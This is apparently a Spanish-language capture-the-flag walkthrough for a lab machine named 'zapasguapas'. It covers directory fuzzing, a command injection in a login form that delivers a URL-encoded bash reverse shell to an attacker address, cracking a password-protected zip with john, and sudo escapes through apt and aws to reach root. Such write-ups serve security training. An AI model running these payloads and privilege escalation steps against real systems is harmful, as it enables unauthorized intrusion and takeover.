PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos fuzzing y encontramos la siguiente ruta:
	-gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.1.141 -t 100 -x php,html,txt (Hay que quitar el --add-slash para que salga)
		/login.html

-Nos encontramos un login muy marronero, probamos a hacer **Command Injection**, funciona en el campo de contraseña.

-Nos abrimos Burpsuite e interceptamos la petición para hacerlo más cómodo

-Nos mandamos la reverse shell Url encodeando el Payload de la siguiente manera:
	GET /run_command.php?username=a&password=a;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.135/1234+0>%261' 
	-Obtenemos conexión!!:
		www-data@zapasguapas:/tmp$

## Escalada de Privilegios

-Entramos a /home/pronike/nota.txt
	-"Creo que proadidas esta detras del robo de mi contraseña"

-Buscamos archivos donde proadidas sea el propietario:
	-find / -user proadidas 2>/dev/null
		-Encontramos el siguiente interesante:
			/opt/importante.zip

-El archivo nos pide contraseña

-Iniciamos un servidor y nos compartimos el archivo .zip con nuestra máquina:
	-python3 -m http.server 8080
	-wget http://192.168.1.135:8080/importante.zip

-Generamos un hash con zip2john y lo rompemos con john:
	-zip2john importante.zip > hash.txt
	-john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
		-Contraseña: hotstuff

-Descomprimimos el archivo aportando la contraseña obtenida:
	-unzip importante.zip
	-password: hotstuff
	-Nos crea una archivo password.txt con la contraseña del usuario 'pronike':
		pronike:pronike11

-Pivotamos al usuario pronike:
	-su pronike 
	-password: pronike11
	pronike@zapasguapas:~/ sudo -l
		(proadidas) NOPASSWD: /usr/bin/apt

-Pivotamos al usuario proadidas:
	sudo -u proadidas apt changelog apt
	!/bin/sh
	proadidas@zapasguapas:~/ sudo -l
		(root) NOPASSWD: /usr/bin/aws

-Escalamos a root
	sudo aws help
	!/bin/sh
	root@zapasguapas:/opt# 




